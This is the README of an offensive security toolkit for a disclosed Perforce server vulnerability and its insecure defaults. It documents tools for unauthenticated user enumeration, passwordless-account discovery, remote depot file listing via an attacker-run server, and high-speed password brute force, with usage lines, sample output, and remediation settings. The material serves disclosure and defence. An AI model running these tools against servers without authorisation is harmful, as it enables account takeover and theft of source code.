# P4WNED (CVE-2026-6043)

Perforce (Helix Core) security research tools and nuclei templates.

**Research article:** https://morganrobertson.net/p4wned/

Please read the above for complete details.

> Authorised targets only. Use on your own servers or with explicit written permission.

**Intended audience:** Perforce server administrators, penetration testers, security engineers

**May 2026 Update:** Perforce 2026.1 has been released. This version ships with secure defaults! Very pleased to see this released to protect developer IP. [Read more here](https://help.perforce.com/helix-core/server-apps/cmdref/current/Content/CmdRef/whats-new-2026-1.html).

Note: These tools scan for the misconfigurations resulting from [CVE-2026-6043](https://nvd.nist.gov/vuln/detail/CVE-2026-6043).

---

## Requirements

| Tool | Requires |
|---|---|
| `p4wned.py` | Python 3, `p4` CLI binary (see below) |
| `p4ghost.py` | Python 3, `p4` CLI binary, local `p4d` instance (see setup below) |
| `p4-auth-hammer` | g++, Perforce C++ API, OpenSSL 1.1.1 (see [`p4-auth-hammer/README.md`](p4-auth-hammer/README.md)) |
| JavaScript tools | Node.js (no external dependencies) |
| Nuclei templates | [Nuclei](https://github.com/projectdiscovery/nuclei) v3+ |
| Metasploit modules | [Metasploit Framework](https://github.com/rapid7/metasploit-framework) |

**Acquiring the `p4` binary** (required by `p4wned.py` and `p4ghost.py`):

```bash
# Subject to Perforce terms of use: https://www.perforce.com/legal
wget https://ftp.perforce.com/perforce/r25.2/bin.linux26x86_64/p4
chmod +x p4
```

---

## Background

Perforce servers expose a custom binary TCP protocol (default port 1666). Many installations ship with insecure defaults — unauthenticated user listing, server info disclosure, accessible remote depots, no password requirements, and no rate-limiting on login attempts. All tools here exploit these defaults without requiring credentials.

---

## Tools

### p4wned.py — Full Security Scanner

The primary scanner. Uses the `p4` CLI binary to enumerate users, test credentials, list depots, and produce a report.

```
python3 p4wned.py [-brute] [-audit] [-parallel N]
```

**Options:**

| Flag | Description |
|---|---|
| `-brute` | Enable brute force mode — tests passwords against all discovered user accounts |
| `-audit` | Thorough audit mode — continues testing all users even after finding a vulnerability |
| `-parallel N` | Number of parallel password attempts (default: 1) |

**Config** (edit at top of script):

| Variable | Description |
|---|---|
| `INPUT_FILE` | Target list (`ip:port`, one per line) — default `perforce-servers.txt` |
| `P4_CMD` | Path to `p4` binary — default `./p4` |
| `TOP_PASSWORDS_FILE` | Wordlist for brute force — default `top-passwords.txt` |
| `KNOWN_CREDS_FILE` | Known credential pairs to try first |
| `REPORT_FILE` | Output report path |

**What it does:**
- Detects ASCII vs unicode server mode
- Enumerates users (if `run.users.authorize=0`)
- Tests for blank passwords and known/common credentials
- Lists depot names and samples recent file paths
- Checks for `super` group membership on compromised accounts
- Outputs a structured text report

**Console output:**

```
$ python3 p4wned.py

                   ___ _  _  __    __    __  __  ___ 
                  / _ \ || |/ / /\ \ \/\ \ \/__\/   \
                 / /_)/ || |\ \/  \/ /  \/ /_\ / /\ /
                / ___/|__   _\  /\  / /\  //__/ /_// 
                \/       |_|  \/  \/\_\ \/\__/___,'  

P4WNED - 0wning P4 servers via shit security defaults since Y2K+25

 · Sniffs out user accounts, blank passwords, weak creds, and dumb settings.
 · Confirms depots access and those juicy "super" user accounts.
 · Drops a tidy report so you can fix the mess before the Skids arrive

Authorised targets only, brotendo. Use on your own servers or at your own risk.
==============================================================================


=== Processing: 192.0.2.10:1666 (perforce.example-studio.com) ===

[INFO] Testing user 'super' for security issues...
[INFO] User 'super' does not exist.

[INFO] Users listing accessible: build, designer1, jsmith, lead_prog, svc_build

[INFO] Testing user 'build' for security issues...
[INFO] Testing user 'designer1' for security issues...
[INFO] Testing user 'jsmith' for security issues...
[INFO] Testing user 'lead_prog' for security issues...
[INFO] Testing user 'svc_build' for security issues...

[INFO] Added new credential for 192.0.2.10:1666: user='svc_build', password='None'
[INFO] Saving updated credentials after finding valid credentials for svc_build on 192.0.2.10:1666

[INFO] Report saved to perforce-report-p4wned-1775436520.txt
```

**Report file** (`perforce-report-p4wned-*.txt`):

```
Perforce Security Scan Report

Server: 192.0.2.10:1666 (perforce.example-studio.com)
  Status: Insecure
  Note: Insecure via user 'svc_build' (no password)

  == Depots ==
Depot depot 2025/11/03 local depot/... 'Default depot'
Depot assets 2024/08/19 local assets/... 'Asset depot'

  == Last 10 Changes ==
Change 1047 on 2025/11/03 14:22:11 by lead_prog@DESKTOP-BUILD01

        Merge branch feature/ai-pathfinding

Change 1046 on 2025/11/03 09:44:38 by designer1@DESKTOP-ART02

        Updated character rig exports

  == Depot Details ==

  Depot: depot
    -- Root Directories --
    //depot/Source
    //depot/Content
    //depot/Config
    This depot is a non-Unreal Engine Depot.

------------------------------------------------------------

Summary Report

Server: 192.0.2.10:1666 - Insecure - Note: Insecure via user 'svc_build' (no password)
```

---

### p4ghost.py — Remote Depot Scanner

Tests for unauthenticated remote depot access via the hidden `remote` user. The exploit works by running an attacker-controlled `p4d` instance locally — the target server connects back to it as part of the server-to-server protocol, leaking its depot file listing in the process.

**Setup** (one-time):

```bash
# Subject to Perforce terms of use: https://www.perforce.com/legal
wget https://ftp.perforce.com/perforce/r24.2/bin.linux26x86_64/p4d
wget https://ftp.perforce.com/perforce/r25.2/bin.linux26x86_64/p4
chmod +x p4d p4

# Start a plain ASCII p4d on port 1818 (used as the attacker's server)
mkdir p4root_attacker
./p4d -r ./p4root_attacker -p 1818 -d

# Start a unicode p4d on a separate port (1819) for unicode targets
mkdir p4root_attacker_unicode
./p4d -r ./p4root_attacker_unicode -xi   # convert to unicode mode
./p4d -r ./p4root_attacker_unicode -p 1819 -d
```

```
python3 p4ghost.py <input_file> [-skipnolicense] [-report FILE] [-p4cmd PATH]
                   [-unicodeport PORT] [-nonunicodeport PORT] [-timeout SECS]
```

```bash
# Example invocation using the local attacker servers above
python3 p4ghost.py targets.txt -nonunicodeport 1818 -unicodeport 1819
```

**Arguments:**

| Flag | Description |
|---|---|
| `input_file` | Target list (`ip:port`, one per line) |
| `-skipnolicense` | Skip servers that return `Server license: none` |
| `-report FILE` | Output report path |
| `-p4cmd PATH` | Path to `p4` binary (default `./p4`) |
| `-unicodeport PORT` | Local unicode `p4d` port to use as attacker's server |
| `-nonunicodeport PORT` | Local non-unicode `p4d` port |
| `-timeout SECS` | Command timeout |

**Affected versions:** All versions below 2025.1 with `security < 4` (default is 0).

---

### p4-auth-hammer — Brute Force PoC (C++)

Proof-of-concept demonstrating that `p4d` does not effectively rate-limit authentication attempts when `security < 3`. Achieves >300,000 login attempts per minute against a single account using the Perforce C++ API.

```
./p4_auth_hammer_poc <server:port> <username> <password_file> [-ticketauth]
```

**Build** (requires Perforce C++ API and OpenSSL 1.1.1 — see [`p4-auth-hammer/README.md`](p4-auth-hammer/README.md) for full setup):

```
bash p4-auth-hammer/p4_auth_hammer_poc_build.sh
```

**Modes:**
- Default: direct password auth (`security < 3`). Rate-limiting is bypassed entirely. >300,000 attempts/min.
- `-ticketauth`: ticket-based login (`security >= 3`). Rate-limiting (`dm.user.loginattempts`) is active at this level.

Auto-detects SSL and unicode servers. Automatically tunes thread count for maximum throughput.

**Remediation:** `p4 configure set security=3` (or 4). See [`p4-auth-hammer/README.md`](p4-auth-hammer/README.md) for full details.

---

## JavaScript Tools

Standalone Node.js scripts. No dependencies beyond Node.js stdlib. All scripts auto-detect SSL vs plain TCP and ASCII vs unicode server mode — no flags required.

**Target file format:** `host:port` one per line, port defaults to 1666 if omitted. Lines starting with `#` are ignored.

```
p4testascii.example.net:1666
p4testunicode.example.net:1666
p4testunicode.example.net:1667
```

**Auto-detection:** Plain TCP is tried first. If the server responds with the Perforce SSL error message (`"Failed client connect, server using SSL"`) the connection is retried over TLS with `rejectUnauthorized: false` (accepts self-signed certs). ASCII mode is tried first; if the server returns the unicode error message the connection is retried with the `unicode` parameter.

---

### perforce-users.js — User Enumeration

Exploits `run.users.authorize=0` (default) to list all user accounts without authentication.

```
node javascript/perforce-users.js [targets_file]
```

Output: `[host:port] [tcp|ssl] username <email> "Full Name"`

---

### perforce-info.js — Server Info Disclosure

Exploits `dm.info.hide=0` (default) to extract server version, internal address, root path, and license string.

```
node javascript/perforce-info.js [targets_file]
```

Output:
```
[host:port] [tcp|ssl]
  Version    : P4D/LINUX26X86_64/2024.2/2877946
  Server Addr: internal-hostname:1666
  Server Root: /opt/perforce/p4root
  License    : Acme Corp
```

---

### perforce-passwordless.js — Passwordless Account Detection

Finds user accounts with no password set. Uses tagged output format (`tag` parameter) to detect the absence of the `Password` field in user records. Passwordless accounts allow direct unauthenticated login.

```
node javascript/perforce-passwordless.js [targets_file]
```

Output: `[host:port] [tcp|ssl] [PASSWORDLESS] username <email> "Full Name"`

---

### perforce-remote.js — Remote Depot File Enumeration

Exploits the hidden `remote` user via the `rmt-DbPipe` server-to-server RPC to read the `db.rev` table directly, extracting depot file paths and change numbers without authentication. Affected versions: below 2025.1 with `security < 4`.

```
node javascript/perforce-remote.js [targets_file]
```

Output:
```
[host:port] [tcp|ssl] 42 file(s) in depot:
  [change=7] [2024-11-03] //depot/src/main.cpp
  [change=3] [2024-09-12] //depot/config/database.yml
```

---

### perforce-keys.js — Global Keys Enumeration

Extracts global key/counter values from Perforce servers. Keys can contain build numbers, internal version strings, and configuration.

```
node javascript/perforce-keys.js [targets_file]
```

Output: `[host:port] [tcp|ssl] keyname = value`

---

## Nuclei Templates

Templates for [Nuclei](https://github.com/projectdiscovery/nuclei). All templates use a TCP gate step to confirm a Perforce server is present before executing the JavaScript payload. Templates use the same auto-detection approach as the JavaScript tools.

```
nuclei -t nuclei-templates/ -u target:1666
nuclei -t nuclei-templates/ -l targets.txt
```

### Detection

| Template | ID | Description |
|---|---|---|
| `perforce-detect.yaml` | `perforce-detection` | Detects Perforce servers via binary protocol handshake. Severity: info. |

### Vulnerability Templates

**Limitations:** No SSL support, port 1666 only. See javascript tools for more.

| Template | ID | Severity | CVSS | Description |
|---|---|---|---|---|
| `perforce-user-extraction.yaml` | `perforce-user-enumeration` | Medium | 5.3 | Unauthenticated user listing — ASCII and unicode servers. Extracts usernames, emails, full names. |
| `perforce-info-disclosure.yaml` | `perforce-info-disclosure` | Medium | 5.3 | Server info disclosure — version, internal address, root path, license. |
| `perforce-passwordless-users.yaml` | `perforce-passwordless-users` | Critical | 9.1 | Finds accounts with no password set. |
| `perforce-remote-depot-unauth.yaml` | `perforce-remote-depot-access-unauth` | High | 7.5 | Remote depot access via `remote` user — ASCII and unicode servers. Extracts file paths and change numbers. Affected: < 2025.1 with `security < 4`. |

---

## Metasploit Modules

Three auxiliary scanner modules for the [Metasploit Framework](https://github.com/rapid7/metasploit-framework), plus a shared library mixin that handles the Perforce binary protocol. These modules cover the same vulnerabilities as the standalone tools above — user enumeration, passwordless account detection, and remote depot exploitation.

All modules auto-detect ASCII vs unicode server mode. SSL is supported.

| Module | Description |
|---|---|
| `auxiliary/scanner/perforce/perforce_user_enum` | Unauthenticated user listing — extracts usernames, emails, full names, and last access times. |
| `auxiliary/scanner/perforce/perforce_passwordless` | Detects accounts with no password set. |
| `auxiliary/scanner/perforce/perforce_remote_depot` | Remote depot file enumeration via the hidden `remote` user. Affected: < 2025.1 with `security < 4`. |

Source files are in the `metasploit/` directory. A PR has been submitted to the Metasploit Framework.

---

**Remediation quick reference:**

| Finding | Fix |
|---|---|
| User enumeration | `p4 configure set run.users.authorize=1` |
| Info disclosure | `p4 configure set dm.info.hide=1` |
| Passwordless users | Set passwords for all accounts; `p4 configure set dm.user.noautocreate=2` |
| Remote depot access | Upgrade to 2025.1+, or `p4 configure set security=4` |
| Auth rate limiting | `p4 configure set security=3` (enables effective lockout via `dm.user.loginattempts`) |
| All of the above | `p4 configure set security=4` plus the individual settings above — `security=4` fixes the remote exploit but does not hide user listings or server info |
